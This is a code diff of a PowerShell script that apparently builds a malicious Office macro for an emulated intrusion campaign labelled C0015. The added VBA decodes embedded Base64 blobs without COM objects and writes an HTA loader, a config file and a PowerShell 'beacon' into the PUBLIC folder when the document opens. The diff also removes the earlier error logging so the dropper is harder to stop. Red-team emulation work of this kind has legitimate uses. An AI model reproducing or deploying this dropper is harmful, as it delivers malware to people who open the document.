@@ -72,43 +72,59 @@ $all.Add((New-Joined 'BCN_B64' $cBcn.Count))
 $all.Add('')
 $all.Add("' -------- write stage files at open (S1 delivery, T1204.002) --------")
 $all.Add(@'
+' native-I/O writer (NO COM objects: no FSO/MSXML/ADODB) - WriteFiles path is
+' build-in VBA only (Open/Put/MkDir) so a COM failure cannot stop it.
+Private Function DecodeB64(ByVal s As String) As Byte()
+    Dim tbl As String, i As Long, n As Long, j As Long, acc As Long, bits As Long
+    Dim c As String, v As Long, out() As Byte
+    tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    n = 0
+    For i = 1 To Len(s)
+        If Mid$(s, i, 1) <> "=" Then n = n + 1
+    Next i
+    ReDim out(0 To (n * 3) \ 4 - 1)
+    i = 1: j = 0: acc = 0: bits = 0
+    Do While i <= Len(s)
+        c = Mid$(s, i, 1)
+        If c <> "=" Then
+            v = InStr(1, tbl, c) - 1
+            acc = acc * 64 + v
+            bits = bits + 6
+            If bits >= 8 Then
+                bits = bits - 8
+                out(j) = (acc \ (2 ^ bits)) Mod 256
+                j = j + 1
+                acc = acc Mod (2 ^ bits)
+            End If
+        End If
+        i = i + 1
+    Loop
+    DecodeB64 = out
+End Function
+
+Private Sub WriteFileNative(ByVal p As String, data() As Byte)
+    On Error Resume Next
+    Dim ff As Integer
+    ff = FreeFile
+    Open p For Binary Access Write As #ff
+    If UBound(data) >= 0 Then Put #ff, , data
+    Close #ff
+End Sub
+
 Private Sub WriteFiles()
-    On Error GoTo Fail
-    Dim fso As Object
-    Set fso = CreateObject("Scripting.FileSystemObject")
+    On Error Resume Next
     Dim d As String
     d = Environ("PUBLIC") & "\C0015"
-    If Not fso.FolderExists(d) Then fso.CreateFolder d
-    Dim t0 As Object
-    Set t0 = fso.CreateTextFile(d & "\macro_ran.txt", True, True)
-    t0.WriteLine "macro entered"
-    t0.Close
-    Dim names(2) As String, blobs(2) As String
-    names(0) = "config.ini":          blobs(0) = CFG_B64
-    names(1) = "bootstrap.hta":       blobs(1) = HTA_B64
-    names(2) = "c0015_beacon.ps1":    blobs(2) = BCN_B64
-    Dim i As Integer
+    MkDir d
+    Dim arr(2) As String, i As Integer
+    arr(0) = "config.ini": arr(1) = "bootstrap.hta": arr(2) = "c0015_beacon.ps1"
     For i = 0 To 2
-        Dim doc As Object, el As Object, st As Object
-        Set doc = CreateObject("Msxml2.DOMDocument")
-        Set el = doc.createElement("b64")
-        el.dataType = "bin.base64"
-        el.text = blobs(i)
-        Set st = CreateObject("ADODB.Stream")
-        st.Type = 1
-        st.Open
-        st.Write el.nodeTypedValue
-        st.SaveToFile d & "\" & names(i), 2
-        st.Close
+        Dim payload() As Byte
+        If i = 0 Then payload = DecodeB64(CFG_B64)
+        If i = 1 Then payload = DecodeB64(HTA_B64)
+        If i = 2 Then payload = DecodeB64(BCN_B64)
+        Call WriteFileNative(d & "\" & arr(i), payload)
     Next i
-    Exit Sub
-Fail:
-    On Error Resume Next
-    Dim f1 As Object, t1 As Object
-    Set f1 = CreateObject("Scripting.FileSystemObject")
-    Set t1 = f1.CreateTextFile(Environ("PUBLIC") & "\C0015\writefiles_err.txt", True, True)
-    t1.WriteLine "WriteFiles err " & Err.Number & " " & Err.Description & " at " & i
-    t1.Close
 End Sub
 '@)
 # ---- inject WriteFiles call at the top of RunEntry ----
